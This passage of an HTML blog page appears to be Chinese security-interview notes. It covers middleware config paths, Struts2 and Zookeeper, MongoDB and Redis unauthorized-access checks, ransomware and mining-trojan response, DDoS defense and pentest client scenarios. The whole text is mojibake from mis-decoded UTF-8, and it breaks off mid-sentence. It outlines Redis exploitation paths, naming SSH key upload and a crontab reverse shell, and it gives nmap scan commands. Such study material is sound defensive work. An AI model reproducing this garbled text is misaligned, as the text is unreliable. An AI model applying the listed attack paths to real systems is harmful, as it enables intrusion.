href="#å¸¸è§ä¸­é—´ä»¶çš„é…ç½®æ–‡ä»¶è·¯å¾„" class="headerlink" title="å¸¸è§ä¸­é—´ä»¶çš„é…ç½®æ–‡ä»¶è·¯å¾„"></a>å¸¸è§ä¸­é—´ä»¶çš„é…ç½®æ–‡ä»¶è·¯å¾„</h2><p>apache (&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;)<br>nginx (&#x2F;etc&#x2F;nginx)<br>iis7 (C:\Windows\System32\inetsrv\config)</p><h2 id="Struts2-ååºåˆ—åŒ–æ¼æ´"><a href="#Struts2-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Struts2 ååºåˆ—åŒ–æ¼æ´"></a>Struts2 ååºåˆ—åŒ–æ¼æ´</h2><p>struts æ˜¯ java çš„ web æ¡†æ¶ã€‚é‡‡å– OGNL è¡¨è¾¾å¼ï¼Œå¤„ç† view å±‚æ•°æ®å­—ç¬¦ä¸²åˆ° controller å±‚è½¬æ¢æˆ java å¯¹è±¡ï¼Œå½±å“æ¯”è¾ƒå¤§çš„æ¼æ´ä¸»è¦ä¸º S2-045\046ï¼Œé€šè¿‡ Content-Type è¿™ä¸ª header å¤´ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼Œé€šè¿‡ Struts2 å¯¹é”™è¯¯æ¶ˆæ¯å¤„ç†è¿›è¡Œå›æ˜¾ã€‚</p><h2 id="Zookeeper-é»˜è®¤çš„ç«¯å£"><a href="#Zookeeper-é»˜è®¤çš„ç«¯å£" class="headerlink" title="Zookeeper é»˜è®¤çš„ç«¯å£"></a>Zookeeper é»˜è®¤çš„ç«¯å£</h2><p>2181ï¼šå¯¹ cline ç«¯æä¾›æœåŠ¡<br>3888ï¼šé€‰ä¸¾ Leader ä½¿ç”¨<br>2888ï¼šé›†ç¾¤å†…æœºå™¨é€šè®¯ä½¿ç”¨ï¼ˆLeader ç›‘å¬æ­¤ç«¯å£ï¼‰</p><h2 id="Zookeeper-æœªæˆæƒè®¿é—®çš„æ£€æŸ¥æ–¹æ³•"><a href="#Zookeeper-æœªæˆæƒè®¿é—®çš„æ£€æŸ¥æ–¹æ³•" class="headerlink" title="Zookeeper æœªæˆæƒè®¿é—®çš„æ£€æŸ¥æ–¹æ³•"></a>Zookeeper æœªæˆæƒè®¿é—®çš„æ£€æŸ¥æ–¹æ³•</h2><p>telnet zookeeper ç«¯å£ï¼Œè¾“å…¥ enviï¼Œå›æ˜¾è·¯å¾„ç­‰ä¿¡æ¯åˆ™å­˜åœ¨ zookeeper æœªæˆæƒè®¿é—®æ¼æ´</p><h2 id="è¯·åˆ—å‡º-Zookeeper-æœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ"><a href="#è¯·åˆ—å‡º-Zookeeper-æœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="è¯·åˆ—å‡º Zookeeper æœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ"></a>è¯·åˆ—å‡º Zookeeper æœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ</h2><ol><li>ç¦æ­¢å°† zookeeper æš´éœ²åœ¨å…¬ç½‘</li><li>ä½¿ç”¨ iptables å¯¹ç«¯å£è¿›è¡Œè®¿é—®æ§åˆ¶</li><li>æ·»åŠ è®¿é—®æ§åˆ¶ï¼Œæ ¹æ®æƒ…å†µé€‰æ‹©å¯¹åº”æ–¹å¼ï¼ˆè®¤è¯ç”¨æˆ·ï¼Œç”¨æˆ·åå¯†ç ï¼‰</li><li>ç»‘å®šæŒ‡å®š IP è®¿é—®</li></ol><h2 id="å¦‚ä½•æ£€æŸ¥-mongodb-æœªæˆæƒè®¿é—®æ¼æ´"><a href="#å¦‚ä½•æ£€æŸ¥-mongodb-æœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="å¦‚ä½•æ£€æŸ¥ mongodb æœªæˆæƒè®¿é—®æ¼æ´"></a>å¦‚ä½•æ£€æŸ¥ mongodb æœªæˆæƒè®¿é—®æ¼æ´</h2><p>æ–¹æ³•ä¸€ï¼šä½¿ç”¨ mongodb_unauth.py è„šæœ¬è¿›è¡Œå¤„ç†ï¼Œå°† ip åœ°å€æ”¾è¿› target.txtï¼Œç”¨æ³•ä¸ºï¼špython mongodb_unauth.py target.txt<br>æ–¹æ³•äºŒï¼šä½¿ç”¨ nmap æ’ä»¶ï¼Œå‘½ä»¤ä¸ºï¼šnmap -p 27017 â€“script mongodb-info 192.168.0.1&#x2F;24</p><h2 id="Redis-æœªæˆæƒæ¼æ´äº§ç”ŸåŸå› "><a href="#Redis-æœªæˆæƒæ¼æ´äº§ç”ŸåŸå› " class="headerlink" title="Redis æœªæˆæƒæ¼æ´äº§ç”ŸåŸå› "></a>Redis æœªæˆæƒæ¼æ´äº§ç”ŸåŸå› </h2><p>Redis é»˜è®¤æƒ…å†µä¸‹ä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰å¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚</p><h2 id="Redis-æœªæˆæƒæ¼æ´åˆ©ç”¨æ¡ä»¶"><a href="#Redis-æœªæˆæƒæ¼æ´åˆ©ç”¨æ¡ä»¶" class="headerlink" title="Redis æœªæˆæƒæ¼æ´åˆ©ç”¨æ¡ä»¶"></a>Redis æœªæˆæƒæ¼æ´åˆ©ç”¨æ¡ä»¶</h2><p>Redis æœåŠ¡ä»¥ root è´¦æˆ·è¿è¡Œã€æ— å¯†ç æˆ–å¼±å¯†ç è¿›è¡Œè®¤è¯ã€ç›‘å¬åœ¨ 0.0.0.0 å…¬ç½‘ä¸Š</p><h2 id="Redis-æœªæˆæƒæ¼æ´åˆ©ç”¨"><a href="#Redis-æœªæˆæƒæ¼æ´åˆ©ç”¨" class="headerlink" title="Redis æœªæˆæƒæ¼æ´åˆ©ç”¨"></a>Redis æœªæˆæƒæ¼æ´åˆ©ç”¨</h2><ol><li>é€šè¿‡ Redis çš„ INFO å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ç›¸å…³çš„å‚æ•°å’Œæ•æ„Ÿä¿¡æ¯ï¼Œä¸ºæ”»å‡»è€…çš„åç»­æ¸—é€åšé“ºå«</li><li>ä¸Šä¼  SSH å…¬é’¥è·å¾— SSH ç™»å½•æƒé™</li><li>é€šè¿‡ crontab åå¼¹ shell</li><li>slave ä¸»ä»æ¨¡å¼åˆ©ç”¨</li></ol><h2 id="Hadoop-ç»„ä»¶ä¸ç›¸å…³ç«¯å£"><a href="#Hadoop-ç»„ä»¶ä¸ç›¸å…³ç«¯å£" class="headerlink" title="Hadoop ç»„ä»¶ä¸ç›¸å…³ç«¯å£"></a>Hadoop ç»„ä»¶ä¸ç›¸å…³ç«¯å£</h2><p>NameNodeï¼šç±»ä¼¼äº Linux ä¸­çš„ root æ ¹ç›®å½•ï¼Œç”¨äºç®¡ç†æ•°æ®å—æ˜ å°„ã€å¤„ç†å®¢æˆ·ç«¯çš„è¯»å†™è¯·æ±‚ã€é…ç½®å‰¯æœ¬ç­–ç•¥å’Œç®¡ç† HDFS çš„åç§°ç©ºé—´ï¼›ç«¯å£å· 50070<br>DataNodeï¼šåœ¨ HDFS ä¸­çœŸæ­£å­˜å‚¨æ•°æ®ï¼Œè´Ÿè´£å­˜å‚¨ client å‘æ¥çš„æ•°æ®å— blockã€æ‰§è¡Œæ•°æ®å—çš„è¯»å†™æ“ä½œ<br>ResourceManagerï¼šYARN é›†ç¾¤ä¸»æ§èŠ‚ç‚¹ï¼Œè´Ÿè´£åè°ƒå’Œç®¡ç†æ•´ä¸ªé›†ç¾¤çš„èµ„æºï¼›ç«¯å£å· 8088<br>NodeManagerï¼šè´Ÿè´£ç®¡ç†ä¸€ä¸ª YARN é›†ç¾¤ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼›ç«¯å£å· 8042<br>HBaseï¼šåˆ†å¸ƒå¼çš„å¼€æºæ•°æ®åº“ï¼Œä¾èµ– Hadoop ç”Ÿæ€ç³»ç»Ÿï¼›ç«¯å£å· 16010<br>Kafkaï¼šåˆ†å¸ƒå¼æ¶ˆæ¯ä¸­é—´ä»¶<br>HDFSï¼šHadoop Distributed File Systemï¼ŒHadoop åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ<br>YARNï¼šHadoop èµ„æºç®¡ç†å™¨<br>Kylinï¼šå¼€æºçš„åˆ†å¸ƒå¼åˆ†æå‹æ•°æ®ä»“åº“ï¼Œä¸»è¦æä¾› Hadoop&#x2F;Spark ä¹‹ä¸Šçš„ SQL æŸ¥è¯¢æ¥å£åŠå¤šç»´åˆ†æç­‰åŠŸèƒ½<br>Hadoop çš„æ¡†æ¶æœ€æ ¸å¿ƒçš„è®¾è®¡å°±æ˜¯ï¼šHDFS å’Œ MapReduceã€‚HDFS ä¸ºæµ·é‡çš„æ•°æ®æä¾›äº†å­˜å‚¨ï¼Œåˆ™ MapReduce ä¸ºæµ·é‡çš„æ•°æ®æä¾›äº†è®¡ç®—ã€‚</p><h2 id="å‡è®¾å®¢æˆ·ä¸­äº†-GhostPetya-å‹’ç´¢ç—…æ¯’ï¼Œè¯·æè¿°éœ€è¦é‡‡å–çš„åº”æ€¥è§£å†³æ–¹æ¡ˆ"><a href="#å‡è®¾å®¢æˆ·ä¸­äº†-GhostPetya-å‹’ç´¢ç—…æ¯’ï¼Œè¯·æè¿°éœ€è¦é‡‡å–çš„åº”æ€¥è§£å†³æ–¹æ¡ˆ" class="headerlink" title="å‡è®¾å®¢æˆ·ä¸­äº† GhostPetya å‹’ç´¢ç—…æ¯’ï¼Œè¯·æè¿°éœ€è¦é‡‡å–çš„åº”æ€¥è§£å†³æ–¹æ¡ˆ"></a>å‡è®¾å®¢æˆ·ä¸­äº† GhostPetya å‹’ç´¢ç—…æ¯’ï¼Œè¯·æè¿°éœ€è¦é‡‡å–çš„åº”æ€¥è§£å†³æ–¹æ¡ˆ</h2><ol><li><p>æœªéƒ¨ç½²ç«¯ç‚¹å®‰å…¨çš„ç»ˆç«¯åº”æ€¥è§£å†³æ–¹æ¡ˆ</p><ol><li>åšå¥½é‡è¦æ–‡ä»¶çš„å¤‡ä»½å·¥ä½œï¼ˆéæœ¬åœ°å¤‡ä»½ï¼‰ã€‚</li><li>å¼€å¯ç³»ç»Ÿé˜²ç«å¢™ã€‚</li><li>åˆ©ç”¨ç³»ç»Ÿé˜²ç«å¢™é«˜çº§è®¾ç½®é˜»æ­¢å‘ 445 ç«¯å£è¿›è¡Œè¿æ¥ï¼ˆè¯¥æ“ä½œä¼šå½±å“ä½¿ç”¨ 445 ç«¯å£çš„æœåŠ¡ï¼‰ã€‚</li><li>æ‰“å¼€ç³»ç»Ÿè‡ªåŠ¨æ›´æ–°ï¼Œå¹¶æ£€æµ‹æ›´æ–°è¿›è¡Œå®‰è£…ã€‚</li><li>åœæ­¢ä½¿ç”¨ Windows XPã€Windows 2003 ç­‰å¾®è½¯å·²ä¸å†æä¾›å®‰å…¨æ›´æ–°çš„æ“ä½œç³»ç»Ÿã€‚</li><li>å¦‚æ— éœ€ä½¿ç”¨å…±äº«æœåŠ¡å»ºè®®å…³é—­è¯¥æœåŠ¡ã€‚</li></ol></li><li><p>å·²éƒ¨ç½²ç«¯ç‚¹å®‰å…¨çš„ç»ˆç«¯åº”æ€¥è§£å†³æ–¹æ¡ˆ</p><ol><li>å¦‚æœç”¨æˆ·å·²ç»éƒ¨ç½²ç»ˆç«¯ç®¡ç†ç±»äº§å“ï¼Œå¯é€šè¿‡ç»ˆç«¯ç®¡ç†è½¯ä»¶è¿›è¡Œå†…ç½‘æ‰“è¡¥ä¸ã€‚</li><li>é€šè¿‡ä¸»æœºé˜²ç«å¢™å…³é—­å…¥æ ˆæµé‡ã€‚ä¸»æœºé˜²ç«å¢™å…³é—­åˆ° 445 å‡ºæ ˆæµé‡ã€‚</li><li>å¼€å¯æ–‡ä»¶å®¡è®¡ï¼Œåªå…è®¸ word.exeï¼Œexplorer.exe ç­‰å¯¹æ–‡ä»¶è®¿é—®ã€‚</li></ol></li><li><p>å·²ç»æ„ŸæŸ“åº”æ€¥è§£å†³æ–¹æ¡ˆ</p><ol><li>æ–­å¼€ç½‘ç»œè¿æ¥ï¼Œé˜»æ­¢è¿›ä¸€æ­¥æ‰©æ•£ã€‚ä¼˜å…ˆæ£€æŸ¥æœªæ„ŸæŸ“ä¸»æœºçš„æ¼æ´çŠ¶å†µï¼ˆå¯ç›´æ¥è”ç³»ç½‘å¾¡æ˜Ÿäº‘å…¬å¸ï¼Œæä¾›å…è´¹æ£€æµ‹å·¥å…·ä½¿ç”¨ï¼‰ï¼Œåšå¥½æ¼æ´åŠ å›ºå·¥ä½œåæ–¹å¯æ¢å¤ç½‘ç»œè¿æ¥ã€‚</li><li>å·²ç»æ„ŸæŸ“ç»ˆç«¯ï¼Œæ ¹æ®ç»ˆç«¯æ•°æ®ç±»å‹å†³å®šå¤„ç½®æ–¹å¼ï¼Œå¦‚æœé‡æ–°å®‰è£…ç³»ç»Ÿåˆ™å»ºè®®å®Œå…¨æ ¼å¼åŒ–</li></ol></li><li><p>é¢„é˜²æªæ–½ï¼š</p><ol><li><p>æ‰“è¡¥ä¸ï¼šåŠæ—¶ç»™ç³»ç»Ÿæ‰“è¡¥ä¸ï¼Œä¿®å¤æ¼æ´ã€‚</p></li><li><p>è£…æ€è½¯ï¼šå®‰è£…æ€æ¯’è½¯ä»¶ï¼ŒåŠæ—¶æ›´æ–°ç—…æ¯’åº“ã€‚å¼€å¯é˜²ç«å¢™ï¼Œå¹¶å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œé˜»æ­¢å‹’ç´¢ç—…æ¯’ä¸å…¶ C&amp;C æœåŠ¡å™¨é€šä¿¡ã€‚</p></li><li><p>åšå¤‡ä»½ï¼šå®šæœŸå¯¹é‡è¦æ–‡ä»¶ä»¥åŠæ•°æ®åº“åšéæœ¬åœ°å¤‡ä»½ã€‚ç”µè„‘å¼€å¯ç³»ç»Ÿå¤‡ä»½ï¼Œå¹¶æ·»åŠ ä¿æŠ¤ï¼ˆè¿™æ ·å¯é€šè¿‡å·å½±å¤‡ä»½å°†ç³»ç»Ÿæ¢å¤åˆ°è¢«åŠ å¯†ä¹‹å‰çš„çŠ¶æ€ï¼‰ã€‚</p></li><li><p>å¤‡ä»½æ¢å¤ï¼šå¦‚æœäº‹å…ˆå·²å¯¹å…³é”®æ–‡ä»¶åšäº†å¤‡ä»½ï¼Œåœ¨ç¡®ä¿å·²æ¸…é™¤ç—…æ¯’æƒ…å†µä¸‹å¯åšæ•°æ®å¤‡ä»½æ¢å¤ã€‚å¦‚æœå·å½±å¤‡ä»½æœªè¢«å‹’ç´¢ç—…æ¯’åˆ é™¤ï¼Œå¯é€šè¿‡å·å½±å¤‡ä»½å°†ç³»ç»Ÿæ¢å¤åˆ°æœªæ„ŸæŸ“å‹’ç´¢ç—…æ¯’çš„æ—¶é—´ç‚¹ã€‚</p></li><li><p>æ”¹å¯†ç ï¼šä½¿ç”¨é•¿åº¦å¤§äº 10 ä½çš„å¤æ‚å¯†ç ã€‚</p></li><li><p>åŠ é™åˆ¶ï¼šç¦ç”¨ GUEST æ¥å®¾ç”¨æˆ·ã€‚å°½é‡ä¸è¦ä½¿ç”¨å±€åŸŸç½‘å…±äº«ï¼Œæˆ–æŠŠå…±äº«ç£ç›˜è®¾ç½®ä¸ºåªè¯»å±æ€§ï¼Œä¸å…è®¸å±€åŸŸç½‘ç”¨æˆ·æ”¹å†™æ–‡ä»¶ã€‚å°½é‡å…³é—­ä¸å¿…è¦çš„ç«¯å£ï¼Œå¦‚ï¼š445ã€135ã€139ã€3389ã€5900 ã€‚</p></li><li><p>é˜²é’“é±¼ï¼šä¸è¦ç‚¹å‡»æ¥æºä¸æ˜çš„é‚®ä»¶ä»¥åŠé™„ä»¶ï¼Œé’“é±¼é‚®ä»¶æ˜¯å‹’ç´¢ç—…æ¯’çš„é‡è¦ä¼ æ’­æºã€‚</p></li></ol></li></ol><h2 id="å¦‚ä½•æ’æŸ¥å¸¸è§æŒ–çŸ¿æœ¨é©¬"><a href="#å¦‚ä½•æ’æŸ¥å¸¸è§æŒ–çŸ¿æœ¨é©¬" class="headerlink" title="å¦‚ä½•æ’æŸ¥å¸¸è§æŒ–çŸ¿æœ¨é©¬"></a>å¦‚ä½•æ’æŸ¥å¸¸è§æŒ–çŸ¿æœ¨é©¬</h2><ol><li>ç³»ç»Ÿå“åº”ç¼“æ…¢</li><li>CPU&#x2F;æ˜¾å¡ä½¿ç”¨ç‡è¿‡é«˜</li><li>å†…å­˜&#x2F;å¸¦å®½å ç”¨é«˜</li></ol><p>ç™»å½•è¿›å¯ç–‘ä¸»æœºåï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç¡®è®¤æŒ–çŸ¿æœ¨é©¬ï¼š</p><ol><li>æŸ¥çœ‹è¿›ç¨‹ï¼ˆç³»ç»Ÿå‘½ psã€ls ä»¤æœ‰å¯èƒ½è¢«æ›¿æ¢ï¼‰</li><li>æ£€æŸ¥æ—¥å¿—ã€æ£€æŸ¥ç³»ç»Ÿç”¨æˆ·</li><li>å‘ç°å¼‚å¸¸æ–‡ä»¶</li></ol><h2 id="ddos-æ”»å‡»å¦‚ä½•å»é˜²èŒƒ"><a href="#ddos-æ”»å‡»å¦‚ä½•å»é˜²èŒƒ" class="headerlink" title="ddos æ”»å‡»å¦‚ä½•å»é˜²èŒƒ"></a>ddos æ”»å‡»å¦‚ä½•å»é˜²èŒƒ</h2><p>ç›®å‰å¯¹äºä½ç½‘ç»œå±‚çš„ DDoS æ”»å‡»æœ‰ä¸€äº›æœ‰æ•ˆçš„é˜²æŠ¤æ‰‹æ®µï¼Œå¦‚ä¸¢å¼ƒç¬¬ä¸€æ¬¡ SYN åŒ…ï¼Œä¸Šæµé‡é˜²æŠ¤è®¾å¤‡ï¼Œä¸Š WAF å°ç¦åœ°å€ç­‰ã€‚<br>æ¯”è¾ƒéš¾ç¼ çš„æ˜¯ç¬¬ä¸ƒå±‚ï¼Œç¬¬å…«å±‚çš„ CC æ”»å‡»ï¼Œå®ƒä¼šæ‰¾åˆ°ç›®æ ‡ç½‘ç«™ä¸Šæ¯”è¾ƒæ¶ˆè€—èµ„æºçš„å…³é”®ä½ç½®ï¼Œé‡å¤å‘èµ·æ”»å‡»ä»¥æ¶ˆè€— CPU&#x2F;å†…å­˜&#x2F;æ•°æ®åº“ IO ç­‰èµ„æºï¼Œç›®å‰çš„åº”ä»˜æ‰‹æ®µæœ‰ï¼šä¼˜åŒ–èµ„æºæ¶ˆè€—é«˜ä½ç½®çš„ä»£ç ï¼Œå¢åŠ ç¡¬ä»¶è®¾å¤‡ï¼Œä¸Šäº‘ï¼Œè´­ä¹°ä¸“ä¸šå®‰å…¨å…¬å¸çš„å®‰å…¨æœåŠ¡ã€‚<br>é™¤æ­¤ä¹‹å¤–ï¼Œéšè—æœåŠ¡å™¨çš„çœŸå® IPã€ä¸Šäº‘ WAFã€CDNã€è´Ÿè½½å‡è¡¡ç­‰è®¾å¤‡ï¼Œæˆ–è€…æš‚æ—¶å°†åŸŸåè§£æåˆ°å…¬å®‰ç½‘è­¦ç½‘ç«™ç­‰ ä¹Ÿæ˜¯å¯ä»¥ä½œä¸ºé€‰æ‹©æ–¹æ¡ˆã€‚</p><h2 id="å¦‚ä½•æ¸…æŸ¥äº’è”ç½‘æš´éœ²é¢"><a href="#å¦‚ä½•æ¸…æŸ¥äº’è”ç½‘æš´éœ²é¢" class="headerlink" title="å¦‚ä½•æ¸…æŸ¥äº’è”ç½‘æš´éœ²é¢"></a>å¦‚ä½•æ¸…æŸ¥äº’è”ç½‘æš´éœ²é¢</h2><p>å¯¹äºå®¢æˆ·ä¸æ¸…æ¥šè‡ªå·±æ˜¯å¦è¿˜æœ‰å…¶ä»–äº’è”ç½‘æš´éœ²é¢çš„æ—¶å€™ï¼Œéœ€è¦å…ˆå°†å®¢æˆ·å·²çŸ¥çš„èµ„äº§æ¸…å•æ”¶é›†èµ·æ¥ï¼Œæ–¹ä¾¿åç»­å¯¹æ¯”ã€‚<br>å¯¹äºå…¬ç½‘æš´éœ²é¢ï¼šåœ¨å‡ºå£ç½‘å…³è®¾ç½®æµé‡ç›‘æ§å·¥å…·ï¼ˆwireshark æˆ–è€…è‡ªå¸¦é˜²ç«å¢™ï¼‰ï¼Œæ£€æµ‹è¶³å¤Ÿé•¿çš„æ—¶é—´ä»¥è·å¾—å¯èƒ½å­˜åœ¨çš„æš´éœ² IP åœ°å€ nmap å…¬ç½‘æ‰«æå…¨ç«¯å£èµ°ä¸€æ³¢ï¼Œç„¶åå¯¹ç…§å·²çŸ¥èµ„äº§æ¸…å•å³å¯ã€‚<br>nmap å…¨ç«¯å£æ‰«æå‘½ä»¤ï¼šnmap -sV -n -Pn -p- -iL ip.txt -oA OUTPUT â€“no-stylesheet â€“min-rate 5000 â€“max-retries 3<br>æœªè®¤é¢†çš„èµ„äº§è¿›è¡Œä¸‹çº¿å…³åœå¤„ç†ã€‚</p><h2 id="å¦‚ä½•å¼€å±•æ‰«æä»»åŠ¡"><a href="#å¦‚ä½•å¼€å±•æ‰«æä»»åŠ¡" class="headerlink" title="å¦‚ä½•å¼€å±•æ‰«æä»»åŠ¡"></a>å¦‚ä½•å¼€å±•æ‰«æä»»åŠ¡</h2><p>é¢˜ç›®æè¿°ï¼šæŸä¸“ä¸šå…¬å¸ A å…¬å¸å®‰å…¨é¡¹ç›®ï¼Œè·Ÿä¸“ä¸šå…¬å¸ A è°ˆå¦¥åå®Œæˆäº†å¤–ç½‘æ‰«æä»»åŠ¡ï¼Œç°åœ¨è¿›è¡Œå†…ç½‘æ‰«æã€‚ç”±äºä¸šåŠ¡é‡æ¯”è¾ƒå¤§å®‰æ’åœ¨æ™šä¸Šä¸‹ç­åè¿›è¡Œæ‰«æã€‚ç¬¬ä¸€å¤©æ‰«ææ™šä¸Š 9 ç‚¹ç”±äºä¸æ˜åŸå› å¯¼è‡´ A ä¸“ä¸šå…¬å¸æ‰€æœ‰ç³»ç»Ÿæ— æ³•è®¿é—®ï¼Œè¢«ä¸“ä¸šå…¬å¸ A çš„äººè¯¢é—®æƒ…å†µï¼Œç¬¬äºŒå¤©æ£€æŸ¥åŸå› å‘ç°ï¼Œæ˜¯å› ä¸ºæ‰€æœ‰æµé‡æ˜¯ç»è¿‡ VPN åˆ°è¾¾ä¸»æœºï¼Œå¯¼è‡´è¿›å‡ºå£ VPN ç½‘å…³å µå¡ï¼Œä¸šåŠ¡æ— æ³•æ­£å¸¸è®¿é—®ï¼Œè¯·é—®è¢«ä¸“ä¸šå…¬å¸ A çš„äººè¯¢é—®æƒ…å†µå¦‚ä½•åº”æ€¥å¤„ç†ï¼Ÿåˆ¤æ–­åŸå› å¹¶è¯´æ˜åç»­å¦‚ä½•å¼€å±•æ‰«æä»»åŠ¡ï¼Ÿ<br>é¦–å…ˆè°ƒè§£å®¢æˆ·æƒ…ç»ªï¼Œè·Ÿå®¢æˆ·æ²Ÿé€šï¼Œç«‹é©¬åœæ­¢æ‰«æä»¥æ¢å¤ä¸šåŠ¡ç³»ç»Ÿæ­£å¸¸ï¼Œå¹¶å‘ŠçŸ¥ A å…¬å¸è¿›è¡Œæ’æŸ¥åŸå› ï¼Œæ£€æŸ¥ç½‘ç»œä¸ä¸»æœºæƒ…å†µã€‚<br>å…¶æ¬¡è€ƒå¯Ÿç½‘ç»œçŸ¥è¯†ï¼Œæ—¢ç„¶æµé‡é€šè¿‡ VPN ä¼šè¿›è¡Œå µå¡ï¼Œæƒ³åŠæ³•ç»•è¿‡æ­¤ VPN æˆ–è€…é™é€Ÿï¼Œè¿™é‡Œè¦æ±‚æä¾›å†…ç½‘æ‰«ææœºå™¨è¿›è¡Œæ‰«æå³å¯ï¼Œä½†éœ€è¦å¸å–ä¸Šæ¬¡ç»éªŒæ‰«æå‰è¿›è¡Œæ‰«ææµ‹è¯•ï¼Œå¦‚åœ¨ä¸­åˆä¼‘æ¯çš„æ—¶å€™è¿›è¡Œæ¢æµ‹æ€§æ‰«æï¼Œæµ‹å‹ã€‚ç„¶ååœ¨æ™šä¸Šå†è¿›è¡Œæ‰«æï¼Œæ‰«ææ—¶éœ€è¦ A å…¬å¸æ´¾ç½‘ç®¡äººå‘˜å¸®å¿™æŸ¥çœ‹ç³»ç»ŸçŠ¶å†µæ˜¯å¦æ­£å¸¸ã€‚</p><h2 id="å®¢æˆ·å¹¶æƒ³è¦æˆ‘æ–¹å¸®å¿™ä¿®å¤æ¼æ´ï¼Œæ­¤åœºæ™¯æ€ä¹ˆå¤„ç†"><a href="#å®¢æˆ·å¹¶æƒ³è¦æˆ‘æ–¹å¸®å¿™ä¿®å¤æ¼æ´ï¼Œæ­¤åœºæ™¯æ€ä¹ˆå¤„ç†" class="headerlink" title="å®¢æˆ·å¹¶æƒ³è¦æˆ‘æ–¹å¸®å¿™ä¿®å¤æ¼æ´ï¼Œæ­¤åœºæ™¯æ€ä¹ˆå¤„ç†"></a>å®¢æˆ·å¹¶æƒ³è¦æˆ‘æ–¹å¸®å¿™ä¿®å¤æ¼æ´ï¼Œæ­¤åœºæ™¯æ€ä¹ˆå¤„ç†</h2><p>é¢˜ç›®æè¿°ï¼šæ‰«æä»»åŠ¡ç»“æŸåå°†ç»“æœå‘ç»™ A å…¬å¸ï¼ŒA å…¬å¸å¯¹å…¶ä¸­çš„ä¸€ç±»å‹æ¼æ´è¡¨ç¤ºç–‘æƒ‘ï¼šè®¤ä¸ºè‡ªå·±æ²¡æœ‰åŠæ³•ä¿®å¤æ­¤ç±»æ¼æ´ï¼ˆæ¯”è¾ƒç§¯æçš„ä¸“ä¸šå…¬å¸ï¼‰ï¼Œå‘æˆ‘æ–¹è¯¢é—®ï¼Œå¹¶æƒ³è¦æˆ‘æ–¹å¸®å¿™ä¿®å¤æ¼æ´ã€‚æ­¤åœºæ™¯åº”è¯¥æ€ä¹ˆå¤„ç†ï¼Ÿ<br>è€ƒå¯Ÿè´£ä»»åˆ’åˆ†é—®é¢˜ï¼ŒåŸåˆ™ä¸Šæ˜¯ä¸å…è®¸ç›´æ¥æ“ä½œå®¢æˆ·å…¬å¸çš„æœºå™¨ï¼Œä»¥åŠå¯¹äºå®¢æˆ·æœºå™¨æƒé™éœ€è¦ç‰¹åˆ«è°¨æ…å¯¹å¾…ï¼Œæˆ‘ä»¬è´Ÿè´£è§£é‡Šæ¼æ´è¿™æ–¹é¢çš„äº‹å®œï¼Œå¹¶ä¸”ç§¯æçš„æä¾›æ•´æ”¹å»ºè®®ï¼Œå¹¶ä¸èƒ½ç›´æ¥æˆ–è€…é—´æ¥æ“ä½œå®¢æˆ·æœºå™¨ã€‚<br>å…¶æ¬¡è€ƒéªŒå®¢æˆ·æƒ³è®©æˆ‘ä»¬ç›´æ¥ä¿®å¤æ¼æ´çš„å¤„ç†æ–¹å¼ï¼Œè¿™ç§æƒ…å†µä¼šç»å¸¸å‡ºç°åœ¨æˆ‘ä»¬çš„æ—¥å¸¸å·¥ä½œä¸­ï¼Œæˆ‘ä»¬è¦è¯´æ˜èŒè´£èŒƒå›´ï¼šæˆ‘ä»¬åªè´Ÿè´£è§£é‡Šæ¼æ´æè¿°å’ŒåŸç†ä»¥åŠä¿®å¤å»ºè®®ï¼Œä»–ä»¬è´Ÿè´£æ•´æ”¹ï¼Œæˆ‘ä»¬å¯¹ç³»ç»Ÿä¸šåŠ¡ä¸ç†Ÿæ‚‰ï¼Œæˆ‘ä»¬äº²è‡ªä¿®å¤è¯å‡ºç°é£é™©å’Œé—®é¢˜ä¹Ÿæ˜¯æˆ‘ä»¬æ‰¿æ‹…ä¸äº†çš„ã€‚</p><h2 id="å®‰å…¨ä»»åŠ¡ç»“æŸåæˆ‘å¸å‘ç»“æœç»™å®¢æˆ·æ—¶ï¼Œé—æ¼äº†æŸä¸ªæ¼æ´ï¼Œå¦‚ä½•ç»™å®¢æˆ·è§£é‡Šå¤„ç†"><a href="#å®‰å…¨ä»»åŠ¡ç»“æŸåæˆ‘å¸å‘ç»“æœç»™å®¢æˆ·æ—¶ï¼Œé—æ¼äº†æŸä¸ªæ¼æ´ï¼Œå¦‚ä½•ç»™å®¢æˆ·è§£é‡Šå¤„ç†" class="headerlink" title="å®‰å…¨ä»»åŠ¡ç»“æŸåæˆ‘å¸å‘ç»“æœç»™å®¢æˆ·æ—¶ï¼Œé—æ¼äº†æŸä¸ªæ¼æ´ï¼Œå¦‚ä½•ç»™å®¢æˆ·è§£é‡Šå¤„ç†"></a>å®‰å…¨ä»»åŠ¡ç»“æŸåæˆ‘å¸å‘ç»“æœç»™å®¢æˆ·æ—¶ï¼Œé—æ¼äº†æŸä¸ªæ¼æ´ï¼Œå¦‚ä½•ç»™å®¢æˆ·è§£é‡Šå¤„ç†</h2><p>é¢˜ç›®æè¿°ï¼šå®‰å…¨ä»»åŠ¡ç»“æŸåï¼Œå‘è¿˜ç»“æœç»™ A å…¬å¸ï¼ŒA 